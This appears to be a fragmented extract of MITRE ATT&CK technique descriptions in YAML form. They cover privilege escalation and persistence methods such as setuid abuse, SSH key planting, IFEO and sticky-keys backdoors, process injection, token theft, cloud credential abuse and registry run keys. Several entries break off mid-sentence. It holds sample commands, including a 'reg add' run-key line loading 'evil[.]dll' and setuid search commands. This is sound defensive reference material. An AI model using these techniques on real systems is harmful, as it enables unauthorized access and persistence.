        While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.

      name: 'Abuse Elevation Control Mechanism: Setuid and Setgid'
      description: |-
        An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

        Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

        Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions.

        Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)

      description: "Adversaries may modify the SSH <code>authorized_keys</code> file
        to maintain persistence on a victim host. Linux distributions, macOS, and
        ESXi hypervisors commonly use key-based authentication to secure the authentication
        process of SSH sessions for remote management. The <code>authorized_keys</code>
        file in SSH specifies the SSH keys that can be used for logging into the user
        account for which the file is configured. This file is usually found in the
        user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>
        (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized
        Keys) Users may edit the system’s SSH config file to modify the directives
        `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure
        public key and RSA authentication are enabled, as well as modify the directive
        `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation:
        Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries
        may modify SSH <code>authorized_keys</code> files directly with scripts or
        shell commands to add their own adversary-supplied public keys. In cloud environments,
        adversaries may be able to modify the SSH authorized_keys file of a particular
        virtual machine via the command line interface or rest API. For example, by
        using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH
        keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google
        Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the
        authorized_keys file of a virtual machine via a PATCH request to the API.(Citation:
        Azure Update Virtual Machines) This ensures that an adversary possessing the
        corresponding private key may log in as an existing user via SSH.(Citation:
        Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead
        to privilege escalation where the virtual machine or instance has distinct
        permissions from the requesting user.\n\nWhere authorized_keys files are modified
        via cloud APIs or command line interfaces, an adversary may achieve privilege
        escalation on the target virtual machine if they add a key to a higher-privileged
        user. \n\nSSH keys can also be added to accounts on network devices, such
        as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)"

      description: |-
        Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

        Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

      name: Temporary Elevated Cloud Access
      description: "Adversaries may abuse permission configurations that allow them
        to gain temporarily elevated access to cloud resources. Many cloud environments
        allow administrators to grant user or service accounts permission to request
        just-in-time access to roles, impersonate other accounts, pass roles onto
        resources and services, or otherwise gain short-term access to a set of privileges
        that may be distinct from their own. \n\nJust-in-time access is a mechanism
        for granting additional roles to cloud accounts in a granular, temporary manner.
        This allows accounts to operate with only the permissions they need on a daily
        basis, and to request additional permissions as necessary. Sometimes just-in-time
        access requests are configured to require manual approval, while other times
        the desired permissions are automatically granted.(Citation: Azure Just in
        Time Access 2023)\n\nAccount impersonation allows user or service accounts
        to temporarily act with the permissions of another account. For example, in
        GCP users with the `iam.serviceAccountTokenCreator` role can create temporary
        access tokens or sign arbitrary payloads with the permissions of a service
        account, while service accounts with domain-wide delegation permission are
        permitted to impersonate Google Workspace accounts.(Citation: Google Cloud
        Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation
        Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation:
        Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange
        Online, the `ApplicationImpersonation` role allows a service account to use
        the permissions associated with specified user accounts.(Citation: Microsoft
        Impersonation and EWS in Exchange) \n\nMany cloud environments also include
        mechanisms for users to pass roles to resources that allow them to perform
        tasks and authenticate to other services. While the user that creates the
        resource does not directly assume the role they pass to it, they may still
        be able to take advantage of the role's access -- for example, by configuring
        the resource to perform certain actions with the permissions it has been granted.
        In AWS, users with the `PassRole` permission can allow a service they create
        to assume a given role, while in GCP, users with the `iam.serviceAccountUser`
        role can attach a service account to a resource.(Citation: AWS PassRole)(Citation:
        Google Cloud Service Account Authentication Roles)\n\nWhile users require
        specific role assignments in order to use any of these features, cloud administrators
        may misconfigure permissions. This could result in escalation paths that allow

      description: "Adversaries may inject malicious code into process via process
        doppelgänging in order to evade process-based defenses as well as possibly
        elevate privileges. Process doppelgänging is a method of executing arbitrary
        code in the address space of a separate live process. \n\nWindows Transactional
        NTFS (TxF) was introduced in Vista as a method to perform safe file operations.
        (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted
        handle to write to a file at a given time. Until the write handle transaction
        is terminated, all other handles are isolated from the writer and may only
        read the committed version of the file that existed at the time the handle
        was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption,
        TxF performs an automatic rollback if the system or application fails during
        a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated,
        the TxF application programming interface (API) is still enabled as of Windows
        10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may
        abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055).
        Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),
        process doppelgänging involves replacing the memory of a legitimate process,
        enabling the veiled execution of malicious code that may evade defenses and
        detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored
        API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>,
        and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging
        Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat
        Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction
        using a legitimate executable then overwrite the file with malicious code.
        These changes will be isolated and only visible within the context of the
        transaction.\n* Load – Create a shared section of memory and load the malicious
        executable.\n* Rollback – Undo changes to original executable, effectively
        removing malicious code from the file system.\n* Animate – Create a process
        from the tainted section of memory and initiate execution.\n\nThis behavior
        will likely not result in elevated privileges since the injected process was
        spawned from (and thus inherits the security context) of the injecting process.
        However, execution via process doppelgänging may evade detection from security
        products since the execution is masked under a legitimate process. "

      name: Executable Installer File Permissions Weakness
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

      name: 'Event Triggered Execution: Accessibility Features'
      description: |-
        Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>

        commonly performed by attaching malicious code to the APC Queue (Citation:
        Microsoft APC) of a process's thread. Queued APC functions are executed when
        the thread enters an alterable state.(Citation: Microsoft APC) A handle to
        an existing victim process is first created with native Windows API calls
        such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can
        be used to invoke a function (such as <code>LoadLibrayA</code> pointing to
        a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\",
        involves creating a suspended process in which malicious code can be written
        and executed before the process' entry point (and potentially subsequent anti-malware
        hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation:

        to the process's memory, system/network resources, and possibly elevated privileges.
        Execution via APC injection may also evade detection from security products
        since the execution is masked under a legitimate process. "

        Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.

        MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)

        Similarly, an adversary with existing access to a network may register a device or a virtual machine to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537)(Citation: Expel Atlas Lion 2025)

        Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)

      description: "Adversaries may inject portable executables (PE) into processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        PE injection is a method of executing arbitrary code in the address space
        of a separate live process. \n\nPE injection is commonly performed by copying
        code (perhaps without a file on disk) into the virtual address space of the
        target process before invoking it via a new thread. The write can be performed
        with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,
        then invoked with <code>CreateRemoteThread</code> or additional code (ex:
        shellcode). The displacement of the injected code does introduce the additional
        requirement for functionality to remap memory references. (Citation: Elastic
        Process Injection July 2017) \n\nRunning code in the context of another process
        may allow access to the process's memory, system/network resources, and possibly
        elevated privileges. Execution via PE injection may also evade detection from
        security products since the execution is masked under a legitimate process. "

      description: |-
        Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

        An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

        When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.

      name: 'Account Manipulation: Additional Cloud Credentials'
      description: "Adversaries may add adversary-controlled credentials to a cloud
        account to maintain persistent access to victim accounts and instances within
        the environment.\n\nFor example, adversaries may add credentials for Service
        Principals and Applications in addition to existing legitimate credentials
        in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:
        Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials
        include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer
        Guidance) With sufficient permissions, there are a variety of ways to add
        credentials including the Azure Portal, Azure command line interface, and
        Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn
        infrastructure-as-a-service (IaaS) environments, after gaining access through
        [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries
        may generate or import their own SSH keys using either the <code>CreateKeyPair</code>
        or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login
        ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows
        persistent access to instances within the cloud environment without further
        usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:
        Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>
        API in AWS or the <code>gcloud iam service-accounts keys create</code> command
        in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>
        API in AWS to add a password that can be used to log into the AWS Management
        Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:
        Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)
        If the target account has different permissions from the requesting account,
        the adversary may also be able to escalate their privileges in the environment
        (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:
        Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel
        2.0) For example, in Entra ID environments, an adversary with the Application
        Administrator role can add a new set of credentials to their application's
        service principal. In doing so the adversary would be able to access the service
        principal’s roles and permissions, which may be different from those of the
        Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)
        \n\nIn AWS environments, adversaries with the appropriate permissions may
        also use the `sts:GetFederationToken` API call to create a temporary set of
        credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)
        tied to the permissions of the original user account. These temporary credentials
        may remain valid for the duration of their lifetime even if the original account’s
        API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation
        Persistence)\n\nIn Entra ID environments with the app password feature enabled,
        adversaries may be able to add an app password to a user account.(Citation:
        Mandiant APT42 Operations 2024) As app passwords are intended to be used with
        legacy devices that do not support multi-factor authentication (MFA), adding
        an app password can allow an adversary to bypass MFA requirements. Additionally,
        app passwords may remain valid even if the user’s primary password is reset.(Citation:
        Microsoft Entra ID App Passwords)"

      description: |-
        Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

        This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.

        Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

        Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)

        WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.

      description: |-
        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

        Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)

        hijacking in order to evade process-based defenses as well as possibly elevate

        executing arbitrary code in the address space of a separate live process.
        \n\nVDSO hijacking involves redirecting calls to dynamically linked shared

        However, an adversary may hijack the syscall interface code stubs mapped into
        a process from the vdso shared object to execute syscalls to open and map
        a malicious shared object. This code can then be invoked by redirecting the
        execution flow of the process via patched memory address references stored
        in a process' global offset table (which store absolute addresses of mapped

Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

        The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

      name: Services File Permissions Weakness
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

      name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
      description: |-
        Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

        The following run keys are created by default on Windows systems:

        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

        Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

        Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

        The following Registry keys can be used to set startup folder items for persistence:

        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

        The following Registry keys can control automatic startup of services during boot:

        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

        Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

        Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.

        By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

        Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

      description: "Adversaries may manipulate accounts to maintain and/or elevate
        access to victim systems. Account manipulation may consist of any action that
        preserves or modifies adversary access to a compromised account, such as modifying
        credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These
        actions could also include account activity designed to subvert security policies,
        such as performing iterative password updates to bypass password duration
        policies and preserve the life of compromised credentials. \n\nIn order to
        create or manipulate accounts, the adversary must already have sufficient
        permissions on systems or the domain. However, account manipulation may also
        lead to privilege escalation where modifications grant access to additional
        roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)."

        Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

        When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)

        Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)

        Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as "Legacy System Extensions" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

        Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)

        Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

        An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

